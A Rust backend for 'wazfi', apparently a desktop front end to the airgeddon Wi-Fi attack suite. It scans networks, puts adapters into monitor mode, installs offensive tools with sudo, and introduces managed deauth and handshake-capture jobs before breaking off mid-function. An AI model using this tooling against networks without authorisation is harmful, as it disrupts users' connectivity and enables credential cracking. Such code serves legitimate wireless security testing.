// wazfi backend — a thin, honest bridge over the host system and the
// airgeddon engine. On Linux it inspects real wireless interfaces and tools;
// on other platforms it reports what it can and flags that live attacks are
// unavailable so the UI can switch to preview mode.

use serde::Serialize;
use std::collections::HashMap;
use std::io::{BufRead, BufReader};
use std::process::{Child, Command, Stdio};
use std::sync::Mutex;
use std::time::Duration;
use tauri::{AppHandle, Emitter, State};

#[derive(Serialize)]
pub struct SystemInfo {
    platform: String,
    os_version: String,
    arch: String,
    attack_capable: bool,
    airgeddon_path: Option<String>,
    airgeddon_version: Option<String>,
    hostname: String,
}

#[derive(Serialize)]
pub struct WifiInterface {
    name: String,
    driver: String,
    chipset: String,
    mac: String,
    mode: String,
    supports_monitor: bool,
    up: bool,
}

#[derive(Serialize)]
pub struct ToolStatus {
    name: String,
    installed: bool,
    category: String,
    path: Option<String>,
}

#[derive(Serialize)]
pub struct Network {
    /// Stable unique id for the UI. On Linux this equals the BSSID; on macOS,
    /// where BSSIDs are not exposed without Location permission, it is synthetic.
    id: String,
    bssid: String,
    essid: String,
    channel: u32,
    power: i32,
    encryption: String,
    wps: bool,
    clients: u32,
    band: String,
}

fn sh(cmd: &str, args: &[&str]) -> Option<String> {
    // Resolve the program ourselves — GUI-launched apps often get a minimal
    // PATH without /sbin:/usr/sbin where iw/ip/airmon-ng live.
    let prog = which(cmd).unwrap_or_else(|| cmd.to_string());
    Command::new(prog)
        .args(args)
        .env("PATH", augmented_path())
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
}

// Standard binary locations, including Homebrew. GUI apps launched from Finder
// get a minimal PATH, so we check these explicitly.
const EXTRA_PATHS: &[&str] = &[
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/bin",
    "/usr/local/sbin",
    "/usr/bin",
    "/bin",
    "/usr/sbin",
    "/sbin",
];

/// A PATH that includes the common locations on top of the inherited one.
fn augmented_path() -> String {
    let cur = std::env::var("PATH").unwrap_or_default();
    let extra = EXTRA_PATHS.join(":");
    if cur.is_empty() {
        extra
    } else {
        format!("{extra}:{cur}")
    }
}

fn which(tool: &str) -> Option<String> {
    // Absolute path given.
    if tool.contains('/') {
        return std::path::Path::new(tool)
            .exists()
            .then(|| tool.to_string());
    }
    // Search the inherited PATH first, then the standard locations. This does
    // NOT shell out to `which` (that would recurse through `sh`) and it covers
    // the minimal PATH a GUI-launched app receives.
    let mut dirs: Vec<String> = Vec::new();
    if let Ok(p) = std::env::var("PATH") {
        dirs.extend(p.split(':').filter(|s| !s.is_empty()).map(str::to_string));
    }
    for d in EXTRA_PATHS {
        dirs.push((*d).to_string());
    }
    for d in dirs {
        let cand = format!("{d}/{tool}");
        if std::path::Path::new(&cand).exists() {
            return Some(cand);
        }
    }
    None
}

fn find_airgeddon() -> Option<String> {
    if let Some(p) = which("airgeddon") {
        return Some(p);
    }
    let candidates = [
        "/usr/share/airgeddon/airgeddon.sh",
        "/usr/bin/airgeddon.sh",
        "/opt/airgeddon/airgeddon.sh",
    ];
    for c in candidates {
        if std::path::Path::new(c).exists() {
            return Some(c.to_string());
        }
    }
    None
}

fn airgeddon_version(path: &str) -> Option<String> {
    let content = std::fs::read_to_string(path).ok()?;
    for line in content.lines().take(400) {
        if let Some(rest) = line.trim().strip_prefix("airgeddon_version=") {
            return Some(rest.trim_matches('"').to_string());
        }
    }
    None
}

#[tauri::command]
fn get_system_info() -> SystemInfo {
    let arch = std::env::consts::ARCH.to_string();
    let os = std::env::consts::OS.to_string();

    let hostname = sh("hostname", &[])
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "localhost".into());

    let (platform, os_version) = match os.as_str() {
        "macos" => {
            let ver = sh("sw_vers", &["-productVersion"])
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
            ("macOS".to_string(), ver)
        }
        "linux" => {
            let pretty = std::fs::read_to_string("/etc/os-release")
                .ok()
                .and_then(|c| {
                    c.lines()
                        .find(|l| l.starts_with("PRETTY_NAME="))
                        .map(|l| {
                            l.trim_start_matches("PRETTY_NAME=")
                                .trim_matches('"')
                                .to_string()
                        })
                })
                .unwrap_or_else(|| "Linux".into());
            ("Linux".to_string(), pretty)
        }
        other => (other.to_string(), String::new()),
    };

    let airgeddon_path = find_airgeddon();
    let airgeddon_version = airgeddon_path.as_deref().and_then(airgeddon_version);

    SystemInfo {
        platform,
        os_version,
        arch,
        attack_capable: cfg!(target_os = "linux"),
        airgeddon_path,
        airgeddon_version,
        hostname,
    }
}

#[cfg(target_os = "macos")]
fn list_interfaces_impl() -> Vec<WifiInterface> {
    let mut out = Vec::new();
    let ports = match sh("networksetup", &["-listallhardwareports"]) {
        Some(p) => p,
        None => return out,
    };

    // Parse blocks separated by blank lines.
    let mut cur_port = String::new();
    let mut cur_dev = String::new();
    let mut cur_mac = String::new();
    let flush = |port: &str, dev: &str, mac: &str, out: &mut Vec<WifiInterface>| {
        if port.contains("Wi-Fi") && !dev.is_empty() {
            let up = sh("ifconfig", &[dev])
                .map(|s| s.contains("status: active"))
                .unwrap_or(false);
            out.push(WifiInterface {
                name: dev.to_string(),
                driver: "Apple AirPort".into(),
                chipset: "Broadcom/Apple Wi-Fi".into(),
                mac: mac.to_uppercase(),
                mode: "managed".into(),
                // macOS userland cannot put the card in airmon-style monitor
                // mode for airgeddon; be honest about it.
                supports_monitor: false,
                up,
            });
        }
    };

    for line in ports.lines() {
        let line = line.trim();
        if line.is_empty() {
            flush(&cur_port, &cur_dev, &cur_mac, &mut out);
            cur_port.clear();
            cur_dev.clear();
            cur_mac.clear();
        } else if let Some(v) = line.strip_prefix("Hardware Port:") {
            cur_port = v.trim().to_string();
        } else if let Some(v) = line.strip_prefix("Device:") {
            cur_dev = v.trim().to_string();
        } else if let Some(v) = line.strip_prefix("Ethernet Address:") {
            cur_mac = v.trim().to_string();
        }
    }
    flush(&cur_port, &cur_dev, &cur_mac, &mut out);
    out
}

#[cfg(target_os = "linux")]
fn list_interfaces_impl() -> Vec<WifiInterface> {
    let mut out = Vec::new();
    let dev = match sh("iw", &["dev"]) {
        Some(d) => d,
        None => return out,
    };

    let mut name = String::new();
    for line in dev.lines() {
        let l = line.trim();
        if let Some(v) = l.strip_prefix("Interface ") {
            name = v.trim().to_string();
        } else if l.starts_with("type ") && !name.is_empty() {
            let mode = l.trim_start_matches("type ").trim().to_string();
            let driver = std::fs::read_link(format!(
                "/sys/class/net/{}/device/driver/module",
                name
            ))
            .ok()
            .and_then(|p| p.file_name().map(|f| f.to_string_lossy().to_string()))
            .unwrap_or_else(|| "unknown".into());
            let mac = std::fs::read_to_string(format!("/sys/class/net/{}/address", name))
                .map(|s| s.trim().to_uppercase())
                .unwrap_or_default();
            let up = std::fs::read_to_string(format!("/sys/class/net/{}/operstate", name))
                .map(|s| s.trim() == "up")
                .unwrap_or(false);
            out.push(WifiInterface {
                name: name.clone(),
                driver,
                chipset: "Wireless adapter".into(),
                mac,
                mode: if mode == "managed" { "managed".into() } else { mode },
                supports_monitor: true,
                up,
            });
            name.clear();
        }
    }
    out
}

#[cfg(not(any(target_os = "macos", target_os = "linux")))]
fn list_interfaces_impl() -> Vec<WifiInterface> {
    Vec::new()
}

#[tauri::command]
fn list_interfaces() -> Vec<WifiInterface> {
    list_interfaces_impl()
}

#[derive(Serialize, Clone)]
pub struct UsbWifi {
    name: String,
    vendor: String,
    vendor_id: String,
    product_id: String,
    chipset: String,
    linux_driver: String,
    /// true when this host has a usable interface for it
    usable_here: bool,
    note: String,
}

/// Known monitor-mode-capable USB Wi-Fi chipsets → (chipset, linux driver).
fn classify_wifi(vid: u32, pid: u32, product: &str) -> Option<(String, String)> {
    const TABLE: &[(u32, u32, &str, &str)] = &[
        (0x0bda, 0x8812, "RTL8812AU", "8812au / realtek-rtl88xxau-dkms"),
        (0x0bda, 0x881a, "RTL8812AU", "8812au / realtek-rtl88xxau-dkms"),
        (0x0bda, 0xa81a, "RTL8812AU", "8812au / realtek-rtl88xxau-dkms"),
        (0x0bda, 0x8813, "RTL8814AU", "8814au"),
        (0x0bda, 0x8178, "RTL8192CU", "rtl8192cu"),
        (0x0bda, 0x8187, "RTL8187", "rtl8187"),
        (0x0cf3, 0x9271, "AR9271 (Atheros)", "ath9k_htc"),
        (0x148f, 0x5370, "RT5370 (Ralink)", "rt2800usb"),
        (0x148f, 0x3070, "RT3070 (Ralink)", "rt2800usb"),
        (0x0e8d, 0x7612, "MT7612U (MediaTek)", "mt76x2u"),
        (0x0e8d, 0x7601, "MT7601U (MediaTek)", "mt7601u"),
    ];
    for &(v, p, chip, drv) in TABLE {
        if vid == v && pid == p {
            return Some((chip.to_string(), drv.to_string()));
        }
    }
    // Heuristic fallback: a known Wi-Fi vendor + a wireless-looking product name.
    let wifi_vendor = matches!(vid, 0x0bda | 0x0cf3 | 0x148f | 0x0e8d | 0x2357 | 0x7392 | 0x13b1);
    let p = product.to_lowercase();
    let looks = ["802.11", "wlan", "wireless", "wi-fi", "wifi", "nic"]
        .iter()
        .any(|k| p.contains(k));
    if wifi_vendor && looks {
        return Some(("Unknown Wi-Fi chipset".to_string(), "chipset-dependent".to_string()));
    }
    None
}

#[cfg(target_os = "macos")]
fn detect_usb_wifi_impl() -> Vec<UsbWifi> {
    let out = match sh_path("ioreg", &["-p", "IOUSB", "-l", "-w", "0"]) {
        Some(o) => o,
        None => return Vec::new(),
    };
    let mut devices = Vec::new();
    let (mut vid, mut pid): (Option<u32>, Option<u32>) = (None, None);
    let mut product = String::new();
    let mut vendor = String::new();

    let parse_num = |line: &str| -> Option<u32> {
        line.split('=').nth(1)?.trim().trim_matches('"').parse::<u32>().ok()
    };
    let parse_str = |line: &str| -> String {
        line.split('=')
            .nth(1)
            .map(|s| s.trim().trim_matches('"').to_string())
            .unwrap_or_default()
    };

    let finalize =
        |vid: &mut Option<u32>, pid: &mut Option<u32>, product: &mut String, vendor: &mut String, devices: &mut Vec<UsbWifi>| {
            if let (Some(v), Some(p)) = (*vid, *pid) {
                if let Some((chipset, drv)) = classify_wifi(v, p, product) {
                    devices.push(UsbWifi {
                        name: if product.is_empty() { "USB Wi-Fi adapter".into() } else { product.clone() },
                        vendor: vendor.clone(),
                        vendor_id: format!("0x{:04x}", v),
                        product_id: format!("0x{:04x}", p),
                        chipset,
                        linux_driver: drv,
                        usable_here: false, // macOS has no monitor-mode path
                        note: "Seen on USB but no macOS driver — this is a Linux adapter. Plug it into your engine host (Linux box, Pi, or VM).".into(),
                    });
                }
            }
            *vid = None;
            *pid = None;
            product.clear();
            vendor.clear();
        };

    for line in out.lines() {
        if line.contains("+-o ") && (line.contains("IOUSBHostDevice") || line.contains("IOUSBDevice")) {
            finalize(&mut vid, &mut pid, &mut product, &mut vendor, &mut devices);
        } else if line.contains("\"idVendor\" =") {
            vid = parse_num(line);
        } else if line.contains("\"idProduct\" =") {
            pid = parse_num(line);
        } else if line.contains("\"USB Product Name\" =") {
            product = parse_str(line);
        } else if line.contains("\"USB Vendor Name\" =") {
            vendor = parse_str(line);
        }
    }
    finalize(&mut vid, &mut pid, &mut product, &mut vendor, &mut devices);
    devices
}

#[cfg(target_os = "linux")]
fn detect_usb_wifi_impl() -> Vec<UsbWifi> {
    let out = match sh_path("lsusb", &[]) {
        Some(o) => o,
        None => return Vec::new(),
    };
    let mut devices = Vec::new();
    for line in out.lines() {
        // e.g. "Bus 001 Device 005: ID 0bda:8812 Realtek ... 802.11n NIC"
        if let Some(idx) = line.find("ID ") {
            let rest = &line[idx + 3..];
            let id_part = rest.split_whitespace().next().unwrap_or("");
            let name = rest[id_part.len()..].trim().to_string();
            if let Some((vh, ph)) = id_part.split_once(':') {
                if let (Ok(v), Ok(p)) = (
                    u32::from_str_radix(vh, 16),
                    u32::from_str_radix(ph, 16),
                ) {
                    if let Some((chipset, drv)) = classify_wifi(v, p, &name) {
                        devices.push(UsbWifi {
                            name: if name.is_empty() { "USB Wi-Fi adapter".into() } else { name },
                            vendor: String::new(),
                            vendor_id: format!("0x{:04x}", v),
                            product_id: format!("0x{:04x}", p),
                            chipset,
                            linux_driver: drv,
                            usable_here: true,
                            note: "Detected. If it's not in monitor mode, load its driver and use airmon-ng.".into(),
                        });
                    }
                }
            }
        }
    }
    devices
}

#[cfg(not(any(target_os = "macos", target_os = "linux")))]
fn detect_usb_wifi_impl() -> Vec<UsbWifi> {
    Vec::new()
}

#[tauri::command]
fn detect_usb_wifi() -> Vec<UsbWifi> {
    detect_usb_wifi_impl()
}

#[tauri::command]
fn check_tools() -> Vec<ToolStatus> {
    let essential = [
        "iw", "ip", "awk", "airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng",
        "iwconfig", "ifconfig",
    ];
    let optional = [
        "hashcat", "hcxdumptool", "hcxpcapngtool", "reaver", "bully", "mdk4", "hostapd",
        "dnsmasq", "lighttpd", "bettercap", "beef", "crunch", "wash", "macchanger",
        "besside-ng", "pyrit", "openssl", "tshark", "hostapd-wpe",
    ];

    let mut out = Vec::new();
    for t in essential {
        let path = which(t);
        out.push(ToolStatus {
            name: t.to_string(),
            installed: path.is_some(),
            category: "essential".into(),
            path,
        });
    }
    for t in optional {
        let path = which(t);
        out.push(ToolStatus {
            name: t.to_string(),
            installed: path.is_some(),
            category: "optional".into(),
            path,
        });
    }
    out
}

#[tauri::command]
fn set_monitor_mode(iface: String, enable: bool) -> Result<Vec<WifiInterface>, String> {
    if !cfg!(target_os = "linux") {
        return Err("monitor mode control requires Linux + airmon-ng".into());
    }
    if enable {
        ensure_monitor(&iface, 0)?;
    } else {
        kill_attack_tools();
        let _ = sudo_sh(&["ip", "link", "set", &iface, "down"]);
        sudo_sh(&["iw", "dev", &iface, "set", "type", "managed"])
            .ok_or_else(|| "failed to set managed mode (need root or passwordless sudo)".to_string())?;
        let _ = sudo_sh(&["ip", "link", "set", &iface, "up"]);
        let _ = sudo_sh(&["nmcli", "dev", "set", &iface, "managed", "yes"]);
    }
    Ok(list_interfaces_impl())
}

#[cfg(any(target_os = "macos", test))]
fn leading_spaces(s: &str) -> usize {
    s.chars().take_while(|c| *c == ' ').count()
}

/// Normalize a macOS/nmcli security string into a short airgeddon-style label.
fn normalize_security(raw: &str) -> String {
    let r = raw.to_uppercase();
    if r.contains("NONE") || r.is_empty() || r == "--" || r == "OPEN" {
        return "OPN".into();
    }
    if r.contains("WEP") {
        return "WEP".into();
    }
    let enterprise = r.contains("ENTERPRISE") || r.contains("802.1X") || r.contains("EAP");
    let base = if r.contains("WPA3") && r.contains("WPA2") {
        "WPA2/WPA3"
    } else if r.contains("WPA3") {
        "WPA3"
    } else if r.contains("WPA2") || r.contains("RSN") {
        "WPA2"
    } else if r.contains("WPA") {
        "WPA"
    } else {
        return raw.trim().to_string();
    };
    if enterprise {
        format!("{}-EAP", base)
    } else {
        base.to_string()
    }
}

/// Parse a "Channel: 7 (2GHz, 20MHz)" value into (channel, band).
fn parse_channel(value: &str) -> (u32, String) {
    let channel = value
        .split_whitespace()
        .next()
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    let band = if value.contains("6GHz") {
        "6GHz"
    } else if value.contains("5GHz") {
        "5GHz"
    } else {
        "2.4GHz"
    };
    (channel, band.to_string())
}

#[cfg(target_os = "macos")]
fn scan_impl(_iface: &str) -> Result<Vec<Network>, String> {
    // system_profiler performs a real scan. macOS redacts SSIDs and hides BSSIDs
    // unless the calling app holds Location Services permission, but channel,
    // band, security and signal are real.
    let out = sh("system_profiler", &["SPAirPortDataType"])
        .ok_or_else(|| "system_profiler returned no data".to_string())?;
    let networks = parse_macos_scan(&out);
    if networks.is_empty() {
        return Err("no networks found (grant Location Services to Wi-Fi scanning, or check adapter)".into());
    }
    Ok(networks)
}

// Pure parser (separated so it can be unit-tested without a live scan).
#[cfg(any(target_os = "macos", test))]
fn parse_macos_scan(out: &str) -> Vec<Network> {
    let mut networks: Vec<Network> = Vec::new();
    let mut in_networks = false;
    let mut cur: Option<Network> = None;
    let mut idx = 0usize;

    let flush = |cur: &mut Option<Network>, networks: &mut Vec<Network>| {
        if let Some(n) = cur.take() {
            if n.channel > 0 || n.encryption != "OPN" {
                networks.push(n);
            }
        }
    };

    for line in out.lines() {
        let indent = leading_spaces(line);
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        if indent <= 10 {
            // Section header or an interface-level field: decide context.
            flush(&mut cur, &mut networks);
            in_networks = trimmed == "Other Local Wi-Fi Networks:"
                || trimmed == "Current Network Information:";
            continue;
        }

        if !in_networks {
            continue;
        }

        if indent == 12 && trimmed.ends_with(':') {
            // New network: the line is its (possibly redacted) name.
            flush(&mut cur, &mut networks);
            idx += 1;
            let name = trimmed.trim_end_matches(':').to_string();
            let essid = if name.contains("redacted") {
                "<hidden>".to_string()
            } else {
                name
            };
            cur = Some(Network {
                id: format!("wifi-{}", idx),
                bssid: "n/a (macOS)".into(),
                essid,
                channel: 0,
                power: -100,
                encryption: "OPN".into(),
                wps: false,
                clients: 0,
                band: "2.4GHz".into(),
            });
        } else if indent >= 14 {
            if let Some(n) = cur.as_mut() {
                if let Some((key, value)) = trimmed.split_once(": ") {
                    match key {
                        "Channel" => {
                            let (ch, band) = parse_channel(value);
                            n.channel = ch;
                            n.band = band;
                        }
                        "Security" => n.encryption = normalize_security(value),
                        "Signal / Noise" => {
                            if let Some(first) = value.split_whitespace().next() {
                                if let Ok(p) = first.parse::<i32>() {
                                    n.power = p;
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
        }
    }
    flush(&mut cur, &mut networks);
    networks
}

#[cfg(target_os = "linux")]
fn scan_impl(iface: &str) -> Result<Vec<Network>, String> {
    // If the adapter is still in monitor mode (e.g. after an attack), flip it
    // back to managed + NM-managed so it can scan again.
    let flipped = sh("iw", &["dev", iface, "info"])
        .map(|s| s.contains("type monitor"))
        .unwrap_or(false);
    if flipped {
        // A leftover airodump/aireplay would immediately force the card back
        // into monitor on link-up — stop them first.
        kill_attack_tools();
        std::thread::sleep(Duration::from_millis(400));
        let _ = sudo_sh(&["ip", "link", "set", iface, "down"]);
        let _ = sudo_sh(&["iw", "dev", iface, "set", "type", "managed"]);
        let _ = sudo_sh(&["ip", "link", "set", iface, "up"]);
        let _ = sudo_sh(&["nmcli", "dev", "set", iface, "managed", "yes"]);
        // Let the link come up before scanning (iw scan returns EBUSY/ENETDOWN
        // immediately after a mode change).
        std::thread::sleep(Duration::from_millis(1800));
    }
    // Prefer NetworkManager (rich, unprivileged); fall back to a privileged iw scan.
    if let Some(out) = sh(
        "nmcli",
        &[
            "-t",
            "-f",
            "BSSID,SSID,CHAN,SIGNAL,SECURITY,FREQ",
            "device",
            "wifi",
            "list",
            "--rescan",
            "yes",
        ],
    ) {
        let mut networks = Vec::new();
        for line in out.lines() {
            // nmcli escapes ':' inside the BSSID as '\:'; split on unescaped ':'.
            let fields = split_nmcli(line);
            if fields.len() < 6 {
                continue;
            }
            let bssid = fields[0].replace("\\:", ":").to_uppercase();
            let essid = if fields[1].is_empty() {
                "<hidden>".to_string()
            } else {
                fields[1].clone()
            };
            let channel = fields[2].parse::<u32>().unwrap_or(0);
            let signal_pct = fields[3].parse::<i32>().unwrap_or(0);
            let power = signal_pct / 2 - 100; // rough %→dBm
            let encryption = normalize_security(&fields[4]);
            let freq = fields[5]
                .split_whitespace()
                .next()
                .and_then(|s| s.parse::<u32>().ok())
                .unwrap_or(0);
            let band = if freq >= 5925 {
                "6GHz"
            } else if freq >= 4900 {
                "5GHz"
            } else {
                "2.4GHz"
            };
            if bssid.is_empty() {
                continue;
            }
            networks.push(Network {
                id: bssid.clone(),
                bssid,
                essid,
                channel,
                power,
                encryption,
                wps: false,
                clients: 0,
                band: band.to_string(),
            });
        }
        if !networks.is_empty() {
            return Ok(networks);
        }
    }

    // Fallback: privileged iw scan (sudo -n when not root). Retry a few times —
    // a just-reconfigured interface can report "busy" for a second or two.
    for attempt in 0..4u8 {
        if let Some(out) = sudo_sh(&["iw", "dev", iface, "scan"]) {
            let nets = parse_iw_scan(&out);
            if !nets.is_empty() {
                return Ok(nets);
            }
        }
        if attempt < 3 {
            std::thread::sleep(Duration::from_millis(1500));
        }
    }
    Err(format!(
        "scan found no networks on {iface} — make sure it's up (not busy from an attack), or launch wazfi with sudo"
    ))
}

#[cfg(target_os = "linux")]
fn split_nmcli(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            if let Some(&next) = chars.peek() {
                cur.push(next);
                chars.next();
            }
        } else if c == ':' {
            out.push(std::mem::take(&mut cur));
        } else {
            cur.push(c);
        }
    }
    out.push(cur);
    out
}

#[cfg(target_os = "linux")]
fn parse_iw_scan(out: &str) -> Vec<Network> {
    let mut networks = Vec::new();
    let mut cur: Option<Network> = None;
    let flush = |cur: &mut Option<Network>, networks: &mut Vec<Network>| {
        if let Some(n) = cur.take() {
            networks.push(n);
        }
    };
    for line in out.lines() {
        let t = line.trim();
        if t.starts_with("BSS ") {
            flush(&mut cur, &mut networks);
            let bssid = t
                .trim_start_matches("BSS ")
                .split('(')
                .next()
                .unwrap_or("")
                .trim()
                .to_uppercase();
            cur = Some(Network {
                id: bssid.clone(),
                bssid,
                essid: "<hidden>".into(),
                channel: 0,
                power: -100,
                encryption: "OPN".into(),
                wps: false,
                clients: 0,
                band: "2.4GHz".into(),
            });
        } else if let Some(n) = cur.as_mut() {
            if let Some(v) = t.strip_prefix("SSID: ") {
                if !v.is_empty() {
                    n.essid = v.to_string();
                }
            } else if let Some(v) = t.strip_prefix("signal: ") {
                if let Some(f) = v.split_whitespace().next() {
                    if let Ok(p) = f.parse::<f32>() {
                        n.power = p as i32;
                    }
                }
            } else if let Some(v) = t.strip_prefix("DS Parameter set: channel ") {
                n.channel = v.trim().parse::<u32>().unwrap_or(0);
            } else if t.contains("RSN:") {
                n.encryption = "WPA2".into();
            } else if t.contains("WPA:") && n.encryption == "OPN" {
                n.encryption = "WPA".into();
            } else if t.contains("WPS:") {
                n.wps = true;
            }
        }
    }
    flush(&mut cur, &mut networks);
    networks
}

#[cfg(not(any(target_os = "macos", target_os = "linux")))]
fn scan_impl(_iface: &str) -> Result<Vec<Network>, String> {
    Err("scanning is only implemented for macOS and Linux".into())
}

#[tauri::command]
fn scan_networks(iface: String) -> Result<Vec<Network>, String> {
    scan_impl(&iface)
}

// --------------------------------------------------------------------------- //
// --------------------------------------------------------------------------- //
// Prerequisites + local tool installer (Linux host)
//
// wazfi runs natively on the Linux host that holds the wireless adapter. Tools
// install locally via the host package manager; output streams to the frontend
// as `install-log` events, finishing with `install-done`.
// --------------------------------------------------------------------------- //

/// Like `sh`, but resolves the program through `which` (packaged-app PATH) and
/// runs with an augmented PATH.
fn sh_path(program: &str, args: &[&str]) -> Option<String> {
    let resolved = which(program)?;
    Command::new(resolved)
        .args(args)
        .env("PATH", augmented_path())
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
}

#[derive(Serialize, Clone)]
pub struct Prereqs {
    os: String,
    /// host package manager for installing tools (apt/pacman/dnf), if any
    pkg_manager: Option<String>,
    is_root: bool,
}

fn host_pkg_manager() -> Option<String> {
    for pm in ["apt-get", "pacman", "dnf"] {
        if which(pm).is_some() {
            return Some(pm.to_string());
        }
    }
    None
}

fn is_root() -> bool {
    sh("id", &["-u"]).map(|s| s.trim() == "0").unwrap_or(false)
}

#[tauri::command]
fn check_prereqs() -> Prereqs {
    Prereqs {
        os: std::env::consts::OS.to_string(),
        pkg_manager: host_pkg_manager(),
        is_root: is_root(),
    }
}

fn emit_ev(app: &AppHandle, event: &'static str, level: &str, line: String) {
    let _ = app.emit(event, serde_json::json!({ "level": level, "line": line }));
}

/// Run a command, streaming combined stdout/stderr as `event` log entries.
fn stream_cmd(app: &AppHandle, event: &'static str, program: &str, args: &[&str]) -> bool {
    emit_ev(app, event, "cmd", format!("{} {}", program, args.join(" ")));
    let resolved = which(program).unwrap_or_else(|| program.to_string());
    let mut child = match Command::new(&resolved)
        .args(args)
        .env("PATH", augmented_path())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            emit_ev(app, event, "err", format!("{program}: {e}"));
            return false;
        }
    };

    let mut handles = Vec::new();
    for (pipe, tag) in [
        (child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), "out"),
        (child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>), "err"),
    ] {
        if let Some(p) = pipe {
            let a = app.clone();
            handles.push(std::thread::spawn(move || {
                for line in BufReader::new(p).lines().map_while(Result::ok) {
                    emit_ev(&a, event, tag, line);
                }
            }));
        }
    }
    for h in handles {
        let _ = h.join();
    }
    matches!(child.wait(), Ok(s) if s.success())
}

/// Map an airgeddon tool name to its distro package. Most are 1:1.
fn map_package(tool: &str) -> String {
    match tool {
        "ip" => "iproute2",
        "awk" => "gawk",
        "airmon-ng" | "airodump-ng" | "aireplay-ng" | "besside-ng" => "aircrack-ng",
        "iwconfig" => "wireless-tools",
        "ifconfig" => "net-tools",
        "hcxpcapngtool" => "hcxtools",
        "wash" => "reaver",
        "beef" => "beef-xss",
        other => other,
    }
    .to_string()
}

fn run_install(app: AppHandle, pm: String, targets: Vec<String>) {
    // Resolve + dedupe packages.
    let mut pkgs: Vec<String> = Vec::new();
    for t in &targets {
        let p = map_package(t);
        if !pkgs.contains(&p) {
            pkgs.push(p);
        }
    }
    if pkgs.is_empty() {
        emit_ev(&app, "install-log", "warn", "nothing to install".into());
        let _ = app.emit(
            "install-done",
            serde_json::json!({ "ok": true, "installed": [], "failed": [] }),
        );
        return;
    }

    let root = is_root();
    let sudo = !root;
    emit_ev(
        &app,
        "install-log",
        "info",
        format!("installing {} package(s) via {}…", pkgs.len(), pm),
    );

    // Build: [sudo -n] <pm> <op...> <pkgs...>
    let run = |app: &AppHandle, op: &[&str]| -> bool {
        let mut full: Vec<&str> = Vec::new();
        if sudo {
            full.push("sudo");
            full.push("-n");
        }
        full.push(&pm);
        full.extend_from_slice(op);
        let pkg_refs: Vec<&str> = pkgs.iter().map(|s| s.as_str()).collect();
        full.extend_from_slice(&pkg_refs);
        stream_cmd(app, "install-log", full[0], &full[1..])
    };

    let ok = match pm.as_str() {
        "apt-get" => {
            // refresh indexes first (best-effort), then install
            let mut upd: Vec<&str> = Vec::new();
            if sudo {
                upd.push("sudo");
                upd.push("-n");
            }
            upd.push("apt-get");
            upd.push("update");
            stream_cmd(&app, "install-log", upd[0], &upd[1..]);
            run(&app, &["install", "-y"])
        }
        "pacman" => run(&app, &["-S", "--noconfirm"]),
        "dnf" => run(&app, &["install", "-y"]),
        _ => false,
    };

    if !ok && sudo {
        emit_ev(
            &app,
            "install-log",
            "err",
            "install failed — need root. Launch wazfi with sudo, or run the install in a root shell.".into(),
        );
    }
    emit_ev(
        &app,
        "install-log",
        if ok { "ok" } else { "err" },
        format!("install finished — {}", if ok { "success" } else { "failed" }),
    );
    let _ = app.emit(
        "install-done",
        serde_json::json!({
            "ok": ok,
            "installed": if ok { pkgs.clone() } else { Vec::<String>::new() },
            "failed": if ok { Vec::<String>::new() } else { pkgs },
        }),
    );
}

/// Install airgeddon tools on this Linux host (apt/pacman/dnf). Streams
/// `install-log` events and finishes with `install-done`.
#[tauri::command]
fn install_tools(app: AppHandle, targets: Vec<String>) -> Result<(), String> {
    let pm = host_pkg_manager().ok_or_else(|| {
        "no supported package manager (apt/pacman/dnf) found — wazfi must run on a Linux host".to_string()
    })?;
    std::thread::spawn(move || run_install(app, pm, targets));
    Ok(())
}

// --------------------------------------------------------------------------- //
// Live attacks (managed aireplay-ng / airodump-ng processes)
//
// Each attack is a background process keyed by a job id ("deauth", "capture").
// Output streams to the frontend as `attack-log` events; `attack-exit` fires
// when the process ends; `handshake-captured` fires when a 4-way handshake is
// found in a capture. Privileged tools run via `sudo -n` when not already root.
// --------------------------------------------------------------------------- //

#[derive(Default)]
struct AttackState(Mutex<HashMap<String, Child>>);

/// Kill any attack tools that could be holding the radio in monitor mode
/// (e.g. an airodump-ng left running by a capture that wasn't stopped).
fn kill_attack_tools() {
    for t in [
        "airodump-ng",
        "aireplay-ng",
        "mdk4",
        "mdk3",
        "reaver",
        "bully",
        "wash",
        "besside-ng",
        "hcxdumptool",
    ] {
        let _ = sudo_sh(&["pkill", "-x", t]);
    }
}

/// Run a short privileged helper command (sudo -n when not root).
fn sudo_sh(args: &[&str]) -> Option<String> {
    if args.is_empty() {
        return None;
    }
    if is_root() {
        sh(args[0], &args[1..])
    } else {
        let mut a: Vec<&str> = vec!["-n"];
        a.extend_from_slice(args);
        sh("sudo", &a)
    }
}

/// Put an interface into monitor mode on a given channel, without airmon-ng
/// (keeps the interface name stable) and without killing NetworkManager
/// globally (we only tell it to ignore this interface).
fn ensure_monitor(iface: &str, channel: u32) -> Result<(), String> {
    let _ = sudo_sh(&["nmcli", "dev", "set", iface, "managed", "no"]);
    sudo_sh(&["ip", "link", "set", iface, "down"])
        .ok_or_else(|| "could not bring the interface down (need root?)".to_string())?;
    sudo_sh(&["iw", "dev", iface, "set", "type", "monitor"])
        .ok_or_else(|| "could not set monitor mode (need root?)".to_string())?;
    let _ = sudo_sh(&["ip", "link", "set", iface, "up"]);
    if channel > 0 {
        let ch = channel.to_string();
        let _ = sudo_sh(&["iw", "dev", iface, "set", "channel", &ch]);
    }
    Ok(())
}

/// Remove ANSI/VT escape sequences (airodump & friends redraw with them).
fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
